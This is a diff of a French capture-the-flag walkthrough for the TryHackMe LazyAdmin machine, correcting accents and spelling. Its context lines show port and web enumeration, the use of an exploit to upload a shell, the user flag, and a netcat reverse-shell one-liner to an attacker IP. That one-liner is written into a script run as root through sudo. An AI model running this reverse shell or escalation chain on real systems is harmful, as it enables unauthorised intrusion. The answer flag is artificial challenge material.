@@ -8,7 +8,7 @@ Description | Difficulté | Lien
 Easy linux machine to practice your skills | Easy 🟢| [THM](https://tryhackme.com/room/lazyadmin)
 
 
-Enumeration de port :
+Énumération de port :
 ```txt
 nmap -A <ip>
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-01 08:30 EDT
@@ -33,7 +33,7 @@ Le port intéressant est le 80, un site internet est derrière.
   <img width="450" height="300" src="./img/apache2.png">
 </p>
 
-Enumeration web :
+Énumération web :
 ```bash
 gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
 ```
@@ -135,9 +135,9 @@ On utilise le script de l'exploit 40716 et le fichier est envoyé.
   <img width="" height="" src="./img/shell.png">
 </p>
 
-Maintenant, on a accès au /home/itguy/ et on remarque qu'un script est dans le home. En regardant le profil de www-data, on remarque qu'il a le droit d'éxécuter ``/usr/bin/perl /home/itguy/backup.pl`` avec les droit root.
+Maintenant, on a accès au /home/itguy/ et on remarque qu'un script est dans le home. En regardant le profil de www-data, on remarque qu'il a le droit d'exécuter ``/usr/bin/perl /home/itguy/backup.pl`` avec les droits root.
 
-On profite pour récupèrer le flag user qui se trouve dans ``/home/itguy/user.txt``
+On profite pour récupérer le flag user qui se trouve dans ``/home/itguy/user.txt``
 
 > **Note**
 > Première question : What is the user flag ? ``THM{63e5bce9271952aad1113b6f1ac28a07}``
@@ -154,7 +154,7 @@ On injecte donc un netcat pour nous faire spawn un shell en root :
 ```bash
 echo 'mkfifo /tmp/gizgf; nc <ip-de-lattaquant> <port> 0</tmp/gizgf | /bin/sh >/tmp/gizgf 2>&1; rm /tmp/gizgf' > /etc/copy.sh
 ```
-Et on execute le script de la manière suivante :
+Et on exécute le script de la manière suivante :
 ```
 sudo /usr/bin/perl /home/itguy/backup.pl
 ```
